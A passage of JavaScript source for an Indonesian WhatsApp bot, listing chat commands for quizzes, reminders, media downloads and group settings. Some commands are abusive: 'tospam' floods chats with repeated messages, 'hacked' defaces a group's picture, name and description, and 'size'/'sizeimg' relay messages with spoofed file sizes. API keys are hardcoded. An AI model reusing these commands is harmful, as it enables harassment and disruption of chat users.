              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
})
              await sleep(30000)
              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebaklirik[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
}
              gameAdd(sender, glimit)
              break
              case 'logoepep5': 
				gatauda = body.slice(10)
                 if (!isRegistered) return reply( ind.noregis())			
				if (args.length < 1) return reply('Teksnya mana um')
				reply(ind.wait())
				buffer = await getBuffer(`https://api.vhtear.com/logoff?hero=Kla&text=${gatauda}&apikey=RanddyGanz`, {method: 'get'})
				ALIYABOT.sendMessage(from, buffer, image, {quoted: faketroli, caption: 'Nih hasilnya kak...'})
				await limitAdd(sender)
				break
        case 'tebaktebakan':
              if (!isRegistered && !itsMe && !isOwner) return reply(`Limit game kamu sudah habis`)
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/tebaktebakan?apikey=beta`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.soal
              ALIYABOT.sendMessage(from, '*+* ```Tebak Tebakan```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply }).then(() => {
              tebaktebakan[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
})
              await sleep(30000)
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              titid = "*Jawaban*: " + jawaban
                   sendButMessage(from, titid, `Klik Untuk Ke Game`, [
          {
            buttonId: `${prefix}tebaktebakan`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
              
              delete tebaktebakan[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
}
              gameAdd(sender, glimit)
              break                            
        case "tebakgambar":
					  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/tebakgambar?apikey=beta`)
   gambar = await getBuffer(anu.result.images)
   setTimeout( () => {
   reply('*➸ Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
   }, 60000) // 1000 = 1s,
   setTimeout( () => {
   reply('_10 Detik lagi…_', text) // ur cods
   }, 30000) // 1000 = 1s,
   setTimeout( () => {
   reply('_30 Detik lagi_…', text) // ur cods
   }, 10000) // 1000 = 1s,
   setTimeout( () => {
   reply('_60 Detik lagi_…', text) // ur cods
   }, 2500) // 1000 = 1s,
   setTimeout( () => {
   ALIYABOT.sendMessage(from, gambar, image, {quoted: mek }) // ur cods
   }, 0) // 1000 = 1s,
   break
               case 'del':
				case 'delete':
				 if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
					ALIYABOT.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
case 'tospam':
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  ALIYABOT.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  ALIYABOT.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await ALIYABOT.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  ALIYABOT.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await ALIYABOT.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  ALIYABOT.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await ALIYABOT.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  ALIYABOT.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
      case "revoke":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        ALIYABOT.revokeInvite(from);
        reply("```Succes revoke link group```");
        break;
      case "opengc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        reply(`*SUCCES OPEN GROUP*`);
        ALIYABOT.groupSettingChange(from, GroupSettingChange.messageSend, false);
        break;
      case "reminder": // by Slavyan
        if (!q)
          return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await ALIYABOT.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              ALIYABOT.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia);
          await ALIYABOT.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              ALIYABOT.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              ALIYABOT.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia);
          await ALIYABOT.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              ALIYABOT.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia);
          await ALIYABOT.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              ALIYABOT.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              ALIYABOT.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
case 'hacked':
  if (!mek.key.fromMe) return;
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   ALIYABOT.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                ALIYABOT.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                ALIYABOT.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                ALIYABOT.sendMessage(from, 'Succes Hacked', text, {quoted: fyt})
case 'mygithub':
  reply('https://github.com/rivalgans')
					break;   
case 'harta':
  reply(mess.wait)
  sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/chartatahta?text=${args[0]}&apikey=${HunterApi}`, `Ni 🗿`)
  break
case 'bocil':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanbocil?apikey=${dapapi}`)
                    kodo = `𝗔𝘀𝘂𝗽𝗮𝗻𝗻𝘆𝗮 𝗞𝗮𝗸 シ︎`
   sendButVideo(from, kodo, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case '+62':
                    get_result = await getBuffer(`https://ALIYABOT.herokuapp.com/api/asupan?apikey=${valkey}`)
                    pll = `𝗔𝘀𝘂𝗽𝗮𝗻𝗻𝘆𝗮 𝗞𝗮𝗸 シ︎`
   sendButVideo(from, pll, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'santuy':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupansantuy?apikey=${dapapi}`)
                    hhh = `𝗔𝘀𝘂𝗽𝗮𝗻𝗻𝘆𝗮 𝗞𝗮𝗸 シ︎`
   sendButVideo(from, hhh, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break 
case 'ukhti':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanukhty?apikey=${dapapi}`)
                    kntl = `𝗔𝘀𝘂𝗽𝗮𝗻𝗻𝘆𝗮 𝗞𝗮𝗸 シ︎`
   sendButVideo(from, kntl, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'rikagusriani':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanrikagusriani?apikey=${dapapi}`)
                    yyy = `𝗔𝘀𝘂𝗽𝗮𝗻𝗻𝘆𝗮 𝗞𝗮𝗸 シ︎`
   sendButVideo(from, yyy, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'ghea':
                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanghea?apikey=${dapapi}`)
                    ggg = `𝗔𝘀𝘂𝗽𝗮𝗻𝗻𝘆𝗮 𝗞𝗮𝗸 シ︎`
   sendButVideo(from, ggg, `Klik Next Untuk Melanjutkan`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await ALIYABOT.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:fgif})
ALIYABOT.relayWAMessage(costick)
break

case 'sizeimg':
if (args.length < 1) return reply('Masukan angkanya')
filsizei = args[0]
costick3 = await ALIYABOT.prepareMessageFromContent(from,{
"imageMessage": {
	"url": m.quoted.url,
	"mimetype": m.quoted.mimetype,
	"caption": m.quoted.caption,
	"fileSha256": m.quoted.fileSha256.toString('base64'),
	"fileLength": filsizei,
	"height": m.quoted.height,
	"width": m.quoted.width,
	"mediaKey": m.quoted.mediaKey.low,
	"jpegThumbnail": m.quoted.jpegThumbnail
}
}, {quoted:ftroli})
ALIYABOT.relayWAMessage(costick3)
break
case 'jadibot':
      case "[jadibot]":
        if (!mek.key.fromMe) return reply("Tidak bisa jadibot di dalam bot");
        jadibot(reply, ALIYABOT, from);
        break;
      case "stopjadibot":
        if (!mek.key.fromMe)
          return reply("tidak bisa stopjadibot kecuali owner");
        stopjadibot(reply);
        break;
      case "listjadibot":
      case "listbot":
        return reply(' Jummlah jadi bot di bot ini : username : @miyoga/@NEKO BOT/@bukan bot bwang/@loli jembot/@dika-bot')
        break

      //------------------< Fitur yg pake button >-------------------
      
	case 'chat':
			if (args[0].startsWith('08')) return grupinv('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return grupinv('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            ALIYABOT.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
case 'viewonce':
res = await ALIYABOT.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": iye,
"viewOnce": true
}
}
}
}, {}) 
ALIYABOT.relayWAMessage(res)
break
case 'hbd': case 'zodiak': case 'zodiac':
let textus = args.join(" ")
if (!q) return grupinv(`Example : ${prefix + command} 2003 01 24`)
const zodiak = [
    ["Capricorn",   new Date(1970, 0, 1)],
    ["Aquarius",    new Date(1970, 0, 20)],
    ["Pisces",      new Date(1970, 1, 19)],
    ["Aries",       new Date(1970, 2, 21)],
    ["Taurus",      new Date(1970, 3, 21)],
    ["Gemini",      new Date(1970, 4, 21)],
    ["Cancer",      new Date(1970, 5, 22)],
    ["Leo",         new Date(1970, 6, 23)],
    ["Virgo",       new Date(1970, 7, 23)],
    ["Libra",       new Date(1970, 8, 23)],
    ["Scorpio",     new Date(1970, 9, 23)],
    ["Sagittarius", new Date(1970, 10, 22)],
    ["Capricorn",   new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
const okbg = new Date(textus)
if (okbg == 'Invalid Date') throw date
const d = new Date()
const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
const birth = [okbg.getFullYear(), okbg.getMonth() + 1, okbg.getDate()]
    
const zodiac = getZodiac(birth[1], birth[2])
const ageD = new Date(d - date)
const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age

const teksh = `
Birth : ${birth.join('-')}
Upcoming hbd : ${birthday.join('-')}
Age : ${cekusia}
Zodiak : ${zodiac}
`.trim()
reply(monospace(teksh))
break
case 'tahta': 
if (args.length < 1) return reply('*Teks nya mana?*') 
tahta = args.join(" ")
reply(mess.wait)
tahta = await getBuffer(`https://api.zeks.xyz/api/hartatahta?apikey=${ZeksApi}&text=${tahta}`)
ALIYABOT.sendMessage(from,tahta,image,{quoted:mek}) 
break 
// debug
  case 'debug':
			 res = await ALIYABOT.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋,\n\n${jam} - ${week} ${weton} - ${date}`,
							"hydratedFooterText": `${fakeyoi}`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
ALIYABOT.relayWAMessage(res)
break
case 'debug2':
   res = await ALIYABOT.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": "",
          "url": ""
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `Hi ${pushname} 👋,\n\n${jam} - ${week} ${weton} - ${date}`,
    "hydratedFooterText": `${fakeyoi}`,
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Script ${fakeyoi}`,
          "url": "https://github.com/rivalgans"
        },
        "index": 0
      }
    ]
  }
}
}, {})
ALIYABOT.relayWAMessage(res)
break
			
              
                 break
			      case "mode":
        if (!mek.key.fromMe) return;
        sendButMessage(from, `MODE SELF/PUBLIC`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}self`,
            buttonText: {
              displayText: `SELF MODE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}public`,
            buttonText: {
              displayText: `PUBLIC MODE`,
            },
            type: 1,
          },
        ]);
        break;
case 'asupanmenu':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.result)
ALIYABOT.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih '})
break
case 'asupancecan':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, image, {quoted: ftrol, caption: 'Nih '})
break
case 'asupanhijaber':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/hijaber?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, image, {quoted: ftrol, caption: 'Nih '})
break
case 'asupansantuy':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/santuy?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih '})
break
case 'asupanukhti':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ukty?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih '})
break
case 'asupanbocil':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/bocil?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih '})
break
case 'asupanghea':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ghea?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih '})
break
case 'asupanrika':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/rikagusriani?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
ALIYABOT.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih '})
break        
case "asupan": // by ALIYABOT
if (!isOwner && !mek.key.fromMe) return reply('Only Owner')
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya Kak✨`, [
          {
            buttonId: `${prefix}+62`,
            buttonText: {
              displayText: `㋛ Asupan +62`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}ghea`,
            buttonText: {
              displayText: `🔖 Asupan Ghea`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}asupan2`,
            buttonText: {
              displayText: `Next Asupan >`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan2": // by ALIYABOT
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya V.2 kak✨`, [
          {
            buttonId: `${prefix}santuy`,
            buttonText: {
              displayText: `🔖 Asupan Santuy`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}bocil`,
            buttonText: {
              displayText: `🔖 Asupan Bocil`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}asupan3`,
            buttonText: {
              displayText: `Next Asupan >`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan3": // by ALIYABOT
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya V.3 kak✨`, [
          {
            buttonId: `${prefix}rikagusriani`,
            buttonText: {
              displayText: `🔖 Asupan Rikagusriani`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}ukhti`,
            buttonText: {
              displayText: `🔖 Asupan Ukhti`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}mygithub`,
            buttonText: {
              displayText: `Follow Kak Github Saya😄`,
            },
            type: 1,
          },
        ]);
        break;
      case "grup":
        if (!mek.key.fromMe) return;
        sendButMessage(from, `GROUP SETTING`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}opengc`,
            buttonText: {
              displayText: `OPEN`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}closegc`,
            buttonText: {
              displayText: `CLOSE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}revoke`,
            buttonText: {
              displayText: `REVOKE INVITE`,
            },
            type: 1,
          },
        ]);
        break;
        
      //JCCHCCGHTHDTRSRS
      case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await hx.twitter(`${ten}`)
            ren = `${g.HD}`
            sendMediaURL(from,ren,'DONE')
            break        
      case "instagram":
        if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
          return reply(mess.Iv);
        if (!q) return reply("Linknya?");
        reply(mess.wait);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              ALIYABOT.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              ALIYABOT.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
      case "tiktokdl":
        var gh = args.join("");
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${link}`
        );
        if (tipe == "audio") {
          sendMediaURL(from, bv.result.media_resources.music.playUrl, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.video.videoUrl, "");
        }
        break;
case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return grupinv('Only Owner')
       if (args.length < 1) return sendButMessage(from, `\`\`\`「 PREFIX SETTING 」\`\`\``, `Silahkan pilih salah satu`, [
          {
            buttonId: `setprefix multi`,
            buttonText: {
              displayText: `Multi Prefix`,
            },
            type: 1,
          },
          {
            buttonId: `setprefix nopref`,
            buttonText: {
              displayText: `No Prefix`,
            },
            type: 1,
          },
          {
            buttonId: `setprefix allpref`,
            buttonText: {
              displayText: `All Prefix`,
            },
            type: 1,
          },
        ], {quoted:foncevid})
           if (c === 'multi'){
              multi = true
              allpref = false
              nopref = false
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else if (c === 'nopref'){
                    multi = false
                    allpref = false
                    nopref = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                   } else if (c === 'allpref'){
                   	allpref = true
                   nopref = false
                   multi = false
                   reply(`Berhasil mengubah prefix ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    allpref = false
                    prefa = `${c}`
                    reply(`Berhasil mengubah prefix ke ${c}`)
                }
                break
      
      case "delvote":
        if (!mek.key.remoteJid) return;
        if (isVote) return reply("Tidak ada sesi Voting");
        delVote(from);
        reply("Sukses Menghapus sesi Voting Di Grup Ini");
        break;
      case "voting":
        if (!isGroupAdmins && !mek.key.fromMe) return;
        if (!isGroup) return reply(mess.only.group);
        if (isVote) return reply("Sesi Voting Sedang Berlangsung Di Grup Ini");
        if (!q)
          return reply(
            "*Voting*\n\n" +
              prefix +
              "voting @tag target | reason  | 1 (1 = 1 Menit)"
          );
        if (
          mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
          mek.message.extendedTextMessage.contextInfo == null
        ) {
          let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
          split = args.join(" ").replace("@", "").split("|");
          if (!Number(split[2]))
            return reply(
              "masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit"
            );
          await mentions(
            "Vote " +
              "@" +
              id.split("@")[0] +
              " Di Mulai" +
              "\n\n" +
              `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,
            [id],
            true
          );
          addVote(from, split[1], split[0], split[2], reply);
        }
        break;
      case "linkwa":
        if (!q) return reply("cari group apa?");
        hx.linkwa(q).then((result) => {
          let res = "*「 _LINK WA_ 」*\n\n";
          for (let i of result) {
